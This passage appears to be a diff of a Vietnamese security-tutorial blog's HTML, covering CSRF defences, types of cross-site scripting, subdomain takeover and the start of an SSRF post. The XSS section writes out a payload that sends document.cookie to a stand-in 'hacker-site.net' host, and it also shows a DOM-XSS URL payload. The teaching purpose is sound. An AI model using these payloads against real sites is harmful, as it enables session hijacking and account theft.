+<ul><li><a href="https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b" target="_blank" rel="noopener">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</a></li><li><a href="https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2" target="_blank" rel="noopener">https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2</a></li><li><a href="https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0" target="_blank" rel="noopener">https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p>Một số trường hợp có thể đoán được giá trị xác thực như việc sử dụng referer-header để xác thực hoặc server cùng tồn tại lỗ hổng CRLF cũng có thể dẫn đến tấn công cookie injection và chuyển sang tấn công CSRF. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Cuối cùng là việc sử dụng xác thực lỏng lẻo như csrf_token không liên kết với users session hoặc bỏ qua xác thực nếu không nhận được csrf_token đều có thể dẫn đến bypass.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Tất cả các trường hợp đều được giải thích rõ  và thực hành trong các lab của PortSwigger, các bạn có thể tham khảo link cuối bài.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Làm thế nào để ngăn chặn tấn công CSRF?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Người dùng không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn. Không truy cập vào các trang web độc hại dễ bị lừa. Không thực thi các file không rõ nguồn gốc và chức năng. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Còn về phía server sử dụng captcha, các thông báo xác nhận. Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không? Các thao tác quan trọng như "đăng nhập" hay là "chuyển khoản" ,"thanh toán" thường là hay sử dụng captcha. Tuy nhiên, việc sử dụng captcha có thể gây khó khăn cho một vài đối tượng người dùng và làm họ khó chịu. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận "bạn có muốn xóa hay k" cũng làm hạn chế các kĩ thuật Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo và kết hợp với lỗi XSS.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Và thứ 2 là sử dụng token (csrf_token,jwt ...): Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo ra token này sẽ nhận đối số là"SESSION". Khi request đến, hệ thống sẽ thực hiên so khớp giá trị token này để quyết định có thực hiện hay không.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Link tham khảo :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li><a href="https://gbhackers.com/a8-cross-site-request-forgery-csrf/" target="_blank" rel="noopener">https://gbhackers.com/a8-cross-site-request-forgery-csrf/</a></li><li><a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener">https://portswigger.net/web-security/csrf</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20App/CROSS%20SIDE%20REQUEST%20FORGERY/" data-id="ckbgnw3800003jnjm349e798u" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-WEB Pentesting/Web App/Cross Site Scripting (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20App/Cross%20Site%20Scripting%20(Part1)/" class="article-date">
+  <time datetime="2020-06-15T15:30:26.764Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20App/Cross%20Site%20Scripting%20(Part1)/">WEB Pentesting/Web App/Cross Site Scripting (Part1)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:heading {"level":4} -->
+<h4>Cross Site Scripting là gì ? Có những kiểu nào ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Cross Site Scripting (XSS) là một trong những kiểu tấn công hay là lỗ hổng phổ biến hiện nay đổi với web application .Nó không gọi tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style Sheet của HTML.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Kỹ thuật&nbsp;XSS&nbsp;được thực hiện dựa trên việc chèn các đoạn script độc hại vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên làm việc (session) của người dùng. Từ đó cho phép kẻ tấn công giả danh thành người dùng , thực hiện bất kỳ chức năng nào mà người dùng có thể thực hiện và truy cập vào bất kỳ dữ liệu nào của người dùng mà không cần phải đăng nhập bằng tài khoản của nạn nhân. Nếu người dùng có quyền truy cập đặc quyền trong ứng dụng thì kẻ tấn công cũng có thể có toàn quyền kiểm soát tất cả các chức năng và dữ liệu của ứng dụng đó.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Một điều lưu ý bạn hiểu là tấn công XSS được thực hiện ở phía client không làm ảnh hưởng đến hệ thống trên server . Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>XSS có 3 kiểu nhưng đều có cách thức tấn công chung là kẻ tấn công sẽ cố gắng gửi cho nạn nhân link có chứa script độc hại hoặc nội dung có chứa script độc hại nhằm lừa người dùng thực thi nó . Sau khi thực thi thì session của người dùng sẽ được gửi đến hacker . Hacker đã có quyền truy cập, thay đổi thông tin tài khoản mà nạn nhân không hề hay biết.  </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đây là một ví dụ kẻ tấn công chèn script qua giá trị đầu vào (input param) thông qua URL :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://dtsa.eu/wp-content/uploads/2017/06/wp_custom_fields_serach_poc-1024x375.png" alt=""/><figcaption>Ví dụ XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Đây là cách thức đơn giản của việc kiểm thử lỗ hổng này, do mức độ bảo mật của các website ngày càng được nâng cao nên các biến thể của cách tấn công cũng đa dạng theo (Cụ thể như thế nào ở phần tiếp theo). Điều tiếp theo chúng ta  cần nhớ Cross Site Scripting (XSS) có 3 loại  chính là :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM based XSS (Biến thể của Reflected)</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Reflected XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Trong 3 loại thì Reflected XSS là loại tấn công phổ biến nhất. Cách thức tấn công chủ yếu là gửi link có chứa script độc hại như sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph {"customFontSize":15.5} -->
+<p style="font-size:15.5px">http://example.com/<a href="https://ac541f041e348399802625d4008000fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" target="_blank" rel="noopener">name=&lt;script&gt;var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;&lt;/script&gt;</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Khi người dùng click vào đường link , request sẽ được gửi lên server, sessionid được trả về phía client và script có trong thành phần (Element)  của website lúc này  và trình duyệt (Browser) sẽ thực thi script đó.Lúc này người dùng đang có phiên làm việc với ứng dụng (example.com), đoạn script sẽ gửi đến server của hacker (hacker-site.net) với giá trị  "document.cookie" - Sessionid. Dưới đây là hình ảnh minh họa các bước tấn công :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://2.bp.blogspot.com/-Up9Gu_xOnLI/VSX6aqmSz0I/AAAAAAAAHWY/dIQi3ZY5JE4/s1600/3-17-2014-5-51-21-PM-700x398.jpg" alt=""/><figcaption>Các bước thực hiện tấn công Reflected XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Một bài lab trên portswigger.net về reflected XSS:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":68,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1024x384.png" alt="" class="wp-image-68"/><figcaption>Reflected Xss Lab on Portswigger</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Trong hình trên, ta chèn script độc hại thông qua biến "search" và đoạn script vẫn nằm trong cặp tag "h1".</p></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:heading {"level":4} -->
+<h4>DOM Based XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Đầu tiên ta cần biết <a rel="noreferrer noopener" href="https://viblo.asia/p/nhung-khai-niem-co-ban-ve-dom-DzVkpoDgenW" target="_blank">DOM</a> là từ viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Để javascript làm việc được với các thẻ HTML thì cần sử dụng đến DOM. Lấy một ví dụ như này: (W3school)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;!DOCTYPE html>
+&lt;html>
+&lt;body>
+
+&lt;p>Click the button to display the URL of the document.&lt;/p>
+
+&lt;button onclick="myFunction()">Try it&lt;/button>
+
+&lt;p id="demo">&lt;/p>
+
+&lt;script>
+function myFunction() {
+  var x = document.URL;
+  document.getElementById("demo").innerHTML = x;
+}
+&lt;/script>
+
+&lt;/body>
+&lt;/html>
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>DOM Based XSS là kỹ thuật khai thác XSS &nbsp;dựa trên việc thao tác với dữ liệu của các DOM này, nó sử dụng dữ liệu của người dùng hay các dữ liệu ngoài như URL để thêm HTML vào trang như ví dụ trên. Về đặc điểm thì nó giống như reflected chỉ khác là payload sẽ không được sử lí bởi server mà nó sử lí bởi client , nó sẽ dựa vào DOM để có thể đưa payload vào làm giá trị của các element  trên  website. Như ví dụ trên ta sẽ sử dụng URL chứa payload nhưng vẫn được coi hợp lệ như sau "http://www.example.com/userdashboard.html#&lt;/p&gt;&lt;script&gt;SomeFunction(somevariable)&lt;/script&gt;" và kết quả sẽ là:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;p>Click the button to display the URL of the document.&lt;/p>
+
+&lt;button onclick="myFunction()">Try it&lt;/button>
+
+&lt;p id="demo">http://www.example.com/userdashboard.html#&lt;/p>&lt;script>SomeFunction(somevariable)&lt;/script>&lt;/p>
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p> Vì vậy lỗ hổng này sẽ khai thác khó hơn các kiểu còn lại vì nó yêu cầu kẻ tấn công có nhiều kiến thức về javascript và html.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Tấn công DOM Based XSS thông thường không qua các giá trị đầu vào mà nó qua "HTML Manipulation sinks" như: InnerHTML, outerHTML,  ...  và "Browser JavaScript execution sinks" như : eval sink, document sink , location sink ... .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>document.write()<br> document.writeln()<br> document.domain<br> someDOMElement.innerHTML<br> someDOMElement.outerHTML<br> someDOMElement.insertAdjacentHTML<br> someDOMElement.onevent</p><cite>The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>add()<br> after()<br> append()<br> animate()<br> insertAfter()<br> insertBefore()<br> before()<br> html()<br> prepend()<br> replaceAll()<br> replaceWith()<br> wrap()<br> wrapInner()<br> wrapAll()<br> has()<br> constructor()<br> init()<br> index()<br> jQuery.parseHTML()<br> $.parseHTML()</p><cite>The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p> Vì chuỗi độc hại được chèn vào trang bằng cách sử dụng innerHTML, nên nó được phân tích cú pháp dưới dạng HTML, khiến tập lệnh độc hại được thực thi.Hầu hết nguyên nhân dẫn đến lỗ hổng do người lập trình đã không kiểm soát đầu vào lỏng lẻo khi dùng các đối tượng trên  và nó cũng có thể tồn tại trong các thư viện như Jquery hay các framework: &nbsp;angular,&nbsp;react, ....  có sẵn mà người phát triển không hay biết. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Một lưu ý khi kiểm tra lỗ hổng DOM Base XSS thì không nên dùng " View page source" (Ctrl +U) để xem luồng xử lí javascript hoạt động bởi vì nó sẽ không thấy được sự thay đổi .Thay vào đó hãy sử dụng "Developer tool" (Ctrl+Shift+I) và search (Ctrl + F) để tìm kiểm. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>STORED XSS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Khác với 2 loại tấn công trên, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy vẫn xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào nhưng giá trị lần này sẽ được lưu vào cơ sở dữ liệu (database , file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.Tiếp theo đó người dùng truy cập vào dữ liệu có chứa script độc hại của hacker dẫn đến script được thực thi. Mức độ phát hiện bị lừa khó hơn 2 kiểu trước .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://i0.wp.com/securitydaily.net/wp-content/uploads/2014/03/stored-xss-scenario1.png?fit=998%2C576&amp;ssl=1" alt=""/><figcaption>Stored XSS</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài 3 kiểu trên còn tồn tại một kiểu XSS được gọi là <strong>SELF-XSS</strong>.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Self-XSS không thể khai thác trực tiếp hay được lưu trữ lại như trong 3 cách trên mà nó yêu cầu phải kết hợp cả kĩ nghệ xã hội (Soical Engineering) - hay hiểu đơn giản là lừa chính nạn nhân thiếu hiểu biết (VD: Lừa  sẽ được thanh toàn miễn phí khi làm theo) chèn script và thực thi ở những vị trí tồn tại  XSS. Tester thường nghĩ là lỗ hổng XSS có thể tồn tại nhưng không thể khai thác được nhưng trong một số Bug Bounty Program vẫn được tính và trao thưởng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":71,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-1.png" alt="" class="wp-image-71"/><figcaption><a href="https://hackerone.com/reports/755679" target="_blank" rel="noopener">https://hackerone.com/reports/755679</a></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Phần tiếp theo XXX sẽ giới thiệu các cách khai thác lỗ hổng này. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Link tham khảo :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li><a href="https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm" target="_blank" rel="noopener">https://tech.bizflycloud.vn/tong-quan-ve-dom-based-cross-site-scripting-dom-xss-20190424103508199.htm</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></li><li></li></ul>
+<!-- /wp:list -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20App/Cross%20Site%20Scripting%20(Part1)/" data-id="ckbgnw3800004jnjmhjy88jx0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-WEB Pentesting/Web Server/SUBDOMAIN TAKEOVER" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/SUBDOMAIN%20TAKEOVER/" class="article-date">
+  <time datetime="2020-06-15T15:28:18.740Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20Server/SUBDOMAIN%20TAKEOVER/">WEB Pentesting/Web Server/SUBDOMAIN TAKEOVER</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:paragraph -->
+<p>Subdomain takeover được công bố vào năm 2014 là một kiểu tấn công vào tên miền phụ (Subdomain) của  một website và nguyên nhân dẫn đến là do việc cấu hình DNS . Bằng cách này hacker có thể chiếm được full quyền kiểm soát của một subdomain từ đó thực hiện các cuộc tấn công giả mạo trang web (phishing) hoặc phát tán mã độc (malwares).</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Như các bạn đã biết<strong> </strong>Domain<strong> </strong>name là tên đại diện của một website hoạt động trên internet, đóng vai trò là một địa chỉ vật lý thay vì dùng địa chỉ ip (lí do tại sao chắc các bạn đều rõ ) . Còn Subdomain<strong>&nbsp;</strong>là phần mở rộng của một tên miền.&nbsp;Subdomain<strong>&nbsp;</strong>có thể được tạo hoàn toàn miễn phí và nó có thể hoạt động như một tên miền thực thụ.&nbsp;Subdomain&nbsp;ra đời nhằm giải quyết về chi phí đăng ký tên miền cũng như giúp bạn tạo ra nhiều website trên các lĩnh vực khác nhau thuộc tên miền chính. Ví dụ :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Domain: example.com</p><p>Subdomain : hello.example.com</p><cite>Domain vs Subdomain</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Gỉa sử bạn ở hữu một domain example.com và server của bạn có ip là 1.2.3.4 . Bây giờ bạn muốn trỏ domain về địa chỉ ip của server , nhà cung cấp tên miền (DNS provider) sẽ có cách giúp bạn làm điều này. Nhà cung cấp sẽ cung cấp trình quản lý tên miền để bạn có thể thêm, sửa ,trỏ tên miền về địa chỉ bạn muốn.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":84,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-2.png" alt="" class="wp-image-84"/><figcaption>Quản lí domain</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Trong phần cấu hình sẽ có mục bản ghi cho tên miền "record" dùng để dùng để mô tả các thông tin về cơ sở dữ liệu DNS, bạn có thể tham khảo <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types" target="_blank" rel="noreferrer noopener" aria-label="DNS_Record (opens in a new tab)">DNS_Record</a> . Đối với vấn đề này ta chỉ biết đến các bản ghi sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Bản ghi A hoặc AAAA</li><li>Bản ghi CNAME</li><li>Bản ghi bổ sung như ALIAS và URL </li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p>Bản ghi A vs AAAA: Đây là các bản ghi thường được dùng, dùng để trỏ một domain hoặc subdomain về một host hay ip tương ứng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bản ghi CNAME : hay còn gọi là Bản ghi bí danh dành cho các tên miền phụ . Bản ghi CNAME cho phép một server có thể có nhiều tên. Nói cách khác bản ghi CNAME cho phép nhiều tên miền cùng trỏ đến một địa chỉ IP cho trước hoặc liên kết tới một bản ghi khác .Ví dụ : "hello.example.com hi.demo.com CNAME"</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bản ghi bổ sung như ALIAS và URL : Đây là những bản ghi không có trong&nbsp;<a href="https://www.ietf.org/rfc/rfc1035.txt" target="_blank" rel="noopener">DNS RFC</a>&nbsp;, vì vậy chúng chỉ được hỗ trợ bởi một số nhà cung cấp DNS nhất định.&nbsp;ALIAS&nbsp;là một bản ghi giả hoạt động như một&nbsp;CNAME&nbsp;nhưng có thể được sử dụng cho cả tên miền gốc và tên miền phụ.&nbsp;Bản&nbsp;ghi chuyển hướng URL&nbsp;được sử dụng để chuyển hướng một tên miền sang một tên miền / URL khác.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>SECOND-ORDER SUBDOMAIN TAKEOVERS</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Quay trở lại vấn đề, việc hacker cơ tiếp quản subdomain là do cấu hình DNS. Thông thường các dịch vụ bên thứ 3 như Desk, Squarespace, Shopify, Github, Tumblr, và Heroku ... khi người dùng đăng kí lấy ứng dụng, tài khoản thì sẽ được cấp một subdomain đi kèm để truy cập trực tiếp vào nội dung của mình như sau :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":85,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-3.png" alt="" class="wp-image-85"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Tuy nhiên mọi người thường muốn dùng tên miền của riêng mình thay vì tên miền của Provider cấp cho. Đơn giản họ chỉ cần cấu hình DNS trỏ tên miền của họ về tiên miền được cung cấp bởi bên thứ 3 : "shop.example.com shops.myshoptify.com"</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":86,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-4-1024x50.png" alt="" class="wp-image-86"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Và vấn đề ở đây xảy ra khi các subdomain do bên thứ 3 cung cấp đã hêt hạn đăng kí sẽ có hai trường hợp xảy ra là người dùng không muốn dùng nữa và quên đăng kí thêm thời gian. Cùng với đó người quản trị không bỏ , thay đổi cấu hình trong DNS .Hacker sẽ tìm các ra subdomain  của người dùng  bằng các công cụ như Subfinder, SubStack , Amass,crt.sh ... </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://mamot.fr/system/media_attachments/files/007/727/655/original/8c42a00a677333d1.png?1577792038" alt="Kết quả hình ảnh cho subfinder"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Sau đó hacker sẽ tìm những subdomain nào không còn sử dụng nữa và khả năng tiếp quản nó. Sử dụng các dấu hiệu như sau để nhận biết :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://securitytrails.com/images/f/1/4/d/c/f14dc8034d6cf93efdf31c19c51b18bc97f19fa6-table.png" alt="tên miền phụ dễ bị chiếm đoạt tên miền phụ trong năm 2019"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Thường hacker sẽ sử dụng các command linux như: host, dig để tìm kiếm tên của bên thứ 3 (provider)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://www.researchgate.net/profile/S_M_Zia_Ur_Rashid/publication/332353497/figure/fig2/AS:746585789042693@1555011331203/Checking-DNS-Record-using-dig-command.png" alt="Kết quả hình ảnh cho dig command"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Tìm các subdomain có sử dụng bản ghi CNAME sẽ có khả năng tiếp quản rất cao. Hacker sẽ đăng kí với bên thứ 3 đó để có tên miền như tên miền người dùng đăng kí và sau đó chỉ cần cấu hình subdomain được cung cấp nhận subdomain, ip tương ứng với cấu hình DNS của người dùng . SUBDOMAIN TAKEOVER!!!!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://0xpatrik.com/content/images/2018/06/takeover_basic.png" alt=""/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Chi tiết thực hiện các bạn có thể tham khảo trong rất nhiều writeup,bugbounty progam :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li><a href="https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd" target="_blank" rel="noopener">https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd</a></li><li><a href="https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1" target="_blank" rel="noopener">https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1</a></li><li><a href="https://hackerone.com/hacktivity" target="_blank" rel="noopener">https://hackerone.com/hacktivity</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p><strong>Làm thế nào để tránh những vấn đề như vậy?&nbsp;: -</strong>&nbsp;Luôn cập nhật hồ sơ DNS của bạn, xóa CNAME hoặc bất kỳ bản ghi DNS nào khác không được sử dụng.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Link tham khảo :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li><a href="https://securitytrails.com/blog/subdomain-takeover-tips" target="_blank" rel="noopener">https://securitytrails.com/blog/subdomain-takeover-tips</a></li><li><a href="https://blog.cystack.net/subdomain-takeover/" target="_blank" rel="noopener">https://blog.cystack.net/subdomain-takeover/</a></li><li><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank" rel="noopener">https://github.com/EdOverflow/can-i-take-over-xyz</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20Server/SUBDOMAIN%20TAKEOVER/" data-id="ckbgnw3810005jnjm1d9u066s" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-WEB Pentesting/Web Server/Server Side Request Forgery (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/Server%20Side%20Request%20Forgery%20(Part1)/" class="article-date">
+  <time datetime="2020-06-15T15:26:07.992Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20Server/Server%20Side%20Request%20Forgery%20(Part1)/">WEB Pentesting/Web Server/Server Side Request Forgery (Part1)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:image -->
+<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/server-side%20request%20forgery.svg" alt="SSRF"/><figcaption>Ảnh minh họa (PortSwigger)</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Server site request Forgery gọi tắt là SSRF, ngược với lại <a href="http://hydrasky.ml/2020/03/cross-site-request-forgery" target="_blank" rel="noopener">CSRF</a> đây là kiểu tấn công giả mạo yêu cầu phía máy chủ, máy chủ sẽ thực hiện các HTTP request đến các tên miền mà attacker muốn . Nguy hiểm hơn tấn công SSRF sẽ giúp hacker bypass và tấn công trực tiếp vào các hệ thống nội bộ (Internal) phía sau tường lửa (Firewall) hoặc các kết nối với bên thứ 3, thực hiện các hành động và truy cập trái phép vào dữ liệu của tổ chức.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":117,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-6.png" alt="" class="wp-image-117"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
